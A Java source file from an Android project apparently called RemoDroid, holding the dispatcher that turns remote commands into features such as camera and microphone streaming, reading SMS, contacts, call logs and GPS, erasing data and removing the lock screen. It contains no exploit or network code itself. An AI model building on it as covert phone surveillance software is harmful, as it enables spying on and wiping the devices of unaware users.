package com.remo.connections;

import android.content.Context;
import android.util.Log;

import java.util.HashMap;
import java.util.Map;

public class DataHandler {

    private static Map<Integer, Feature> FeaturesDict = new HashMap<>();
    public static Map<Integer, Class> FeaturesClassesDict = new HashMap<>();



    static void init(){

    }



    public static void distribute(String FullOrder, Context context) {
        int order_feature_part = -1, order_type = -1;
        String order_params = "";
        try {
            order_feature_part = Integer.parseInt(FullOrder.split(":")[0]);
            order_type = Integer.parseInt(FullOrder.split(":")[1]);
            order_params = FullOrder.split(":")[2];
        } catch (Exception ex) {
            Log.e("REMODROID","DH Parse Exception: " + ex.getMessage());
        }


        if (order_type == eOrderType.START.ordinal()) {

            try {
                Class tempC = FeaturesClassesDict.get(order_feature_part);
                if(tempC == null){
                    Log.e("REMODROID","DH START Ex tempC == null : is FClassDict(order_feature_part)? " + (FeaturesClassesDict.get(order_feature_part)==null));
                }
                Feature tempF = (Feature) tempC.newInstance();
                FeaturesDict.put(order_feature_part, tempF);
                FeaturesDict.get(order_feature_part).start(order_feature_part,order_params);
            } catch (Exception e) {
                Log.e("REMODROID","DH START Exception: " + e.getMessage());
            }

        }else if (order_type == eOrderType.UPDATE.ordinal()) {

            FeaturesDict.get(order_feature_part).update(order_params);

        }else if (order_type == eOrderType.STOP.ordinal()) {

            FeaturesDict.get(order_feature_part).stop();
        }





//
//
//
//        if (order_feature_part == eDataType.INFO.ordinal()) {
//
//            Feature c = new MobileInfo();
//            c.init(order_feature_part);
//            FeaturesDict.put(order_feature_part, c);
//
//        } else if (order_feature_part == eDataType.CAM.ordinal()) {
//            if (order_type == eOrderType.START.ordinal()) {
//                //Log.d("REMODROID", "Cam");
//                Feature c = new CamStream();
//                FeaturesDict.put(order_feature_part, c);
//                c.init(order_feature_part);
//            } else if (order_type == eOrderType.UPDATE.ordinal()) {
//                ((CamStream) FeaturesDict.get(order_feature_part)).setQuality(Integer.parseInt(order_params));
//
//
//            } else if (order_type == eOrderType.STOP.ordinal()) {
//                FeaturesDict.get(eDataType.CAM.ordinal()).stopStream();
//                FeaturesDict.remove(eDataType.CAM.ordinal());
//            }
//
//
//        } else if (order_feature_part == eDataType.MIC.ordinal()) {
//
//
//            if (order_type == eOrderType.START.ordinal()) {
//                Feature c = new MicStream();
//                FeaturesDict.put(order_feature_part, c);
//                c.init(order_feature_part);
//            } else if (order_type == eOrderType.UPDATE.ordinal()) {
//
//            } else if (order_type == eOrderType.STOP.ordinal()) {
//                FeaturesDict.get(eDataType.MIC.ordinal()).stopStream();
//                FeaturesDict.remove(eDataType.MIC.ordinal());
//            }
//
//        }
//
//        else if (order_feature_part == eDataType.FM_LIST.ordinal()) {
//
//
//            if (order_type == eOrderType.START.ordinal()) {
//                Feature c = new FileMan(order_params);
//                if(FeaturesDict.containsKey(order_feature_part))
//                    FeaturesDict.remove(eDataType.MIC.ordinal());
//                FeaturesDict.put(order_feature_part, c);
//                c.init(order_feature_part);
//            } else if (order_type == eOrderType.UPDATE.ordinal()) {
//
//            } else if (order_type == eOrderType.STOP.ordinal()) {
//                FeaturesDict.get(eDataType.MIC.ordinal()).stopStream();
//                FeaturesDict.remove(eDataType.MIC.ordinal());
//            }
//        }
//        else if (order_feature_part == eDataType.CONTACTS.ordinal()) {
//
//            Feature c = new Contacts();
//            c.init(order_feature_part);
//            FeaturesDict.put(order_feature_part, c);
//
//        }
//
//        else if (order_feature_part == eDataType.SMS.ordinal()) {
//
//            Feature c = new SMS();
//            c.init(order_feature_part);
//            FeaturesDict.put(order_feature_part, c);
//
//        }
//        else if (order_feature_part == eDataType.CALL_LOG.ordinal()) {
//
//            Feature c = new Call_Log();
//            c.init(order_feature_part);
//            FeaturesDict.put(order_feature_part, c);
//
//        }
    }


    public enum eConnectionType {
        Main,
        Feature

    }

    public enum eOrderType {
        START,
        STOP,
        UPDATE,
        ONE_SHOT
    }

    public enum eDataType {
        INIT_CONNECTION,
        INFO,
        CAM,
        MIC,
        FM_LIST,
        FM_DOWN,
        CONTACTS,
        SMS,
        GPS,
        CALL_LOG,
        CALL_RECORDS,
        ERASE_DATA,
        REMOVE_PATTERN_LOCK,
        MAKE_NOISE,
        ERROR
    }
}